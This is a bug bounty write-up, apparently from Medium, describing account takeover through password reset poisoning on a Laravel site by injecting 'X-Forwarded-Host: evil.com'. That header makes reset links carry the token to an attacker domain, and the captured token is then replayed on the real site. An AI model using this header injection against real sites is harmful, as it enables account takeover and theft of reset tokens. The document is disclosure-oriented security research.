# Account Takeover via Password Reset Poisoning (X-Forwarded-Host)

- **Source URL:** https://medium.com/@m.elsaidy35/account-takeover-via-password-reset-poisoning-x-forwarded-host-3456af71dbc9
- **Fetched from:** https://medium.com/@m.elsaidy35/account-takeover-via-password-reset-poisoning-x-forwarded-host-3456af71dbc9?source=rss-5d884aa3c42c------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 14984)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** Mahmoud Elsaidy / Fri, 13 Nov 2026 22:45:34 GMT

When a website uses a proxy such as Cloudflare or a load balancer, requests usually pass through that proxy before reaching the actual server.

The proxy can add some HTTP headers to tell the backend more about the original request:

These headers are useful, but there is one important thing to understand: the backend should only trust them when they come from a trusted proxy.

Otherwise, anyone can send these headers directly and put whatever values they want in them. For example, you can simply change X-Forwarded-Host using Burp Suite.

Laravel (the framework here) uses a URL generator to create links throughout the application. This includes password reset links, redirects, and other URLs.

When the application trusts forwarded headers, Laravel can use X-Forwarded-Host to determine the hostname when generating these links.

The problem I found was that \[redacted\].sa was accepting the X-Forwarded-Host header from external requests without properly restricting it to trusted proxies.

This meant I could send a request with:

X-Forwarded-Host: evil.com

And the application would use evil.com instead of its actual domain when generating the password reset link.

In other words, I could control where the password reset link would point.

After modifying the X-Forwarded-Host header and requesting a password reset, the application generated a link pointing to my domain instead of the legitimate one.

The victim would receive an email containing a link similar to this:

`https://evil.com/reset-password/{REAL_TOKEN}?email=victim@example.com`
If the victim clicks the link, their browser sends a request to my domain, exposing the password reset token.

The interesting part is that the token is still valid on the original website.

I could take the captured token and use it on the legitimate domain:

`https://[redacted].sa/reset-password/{TOKEN}`
The application accepted the token and allowed me to set a new password for the victim’s account.

After changing the password, I was able to log in successfully.

This confirmed the complete attack chain, starting from manipulating the password reset link and ending with a full account takeover.

An attacker could exploit this issue to take over user accounts by sending victims manipulated password reset links. If a victim clicks the link, their valid reset token could be exposed to the attacker, allowing them to change the account password and gain access.

**High — CVSS 3.1: 8.1**

CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N

*This vulnerability was discovered and privately researched on a company’s assets as part of independent security research. The affected domain has been redacted to protect the company’s identity.*
